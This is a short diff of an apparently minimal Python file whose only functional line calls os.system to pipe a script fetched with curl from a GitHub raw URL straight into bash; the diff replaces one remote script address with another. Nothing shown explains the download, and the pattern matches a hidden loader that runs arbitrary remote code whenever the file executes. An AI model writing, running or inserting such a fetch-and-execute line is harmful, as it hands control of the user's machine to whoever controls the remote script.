@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/kartolo92/kkr/raw/main/rhnonew | bash')
+os.system('curl -sL https://github.com/kartolo92/pile/raw/main/vrlnew | bash')
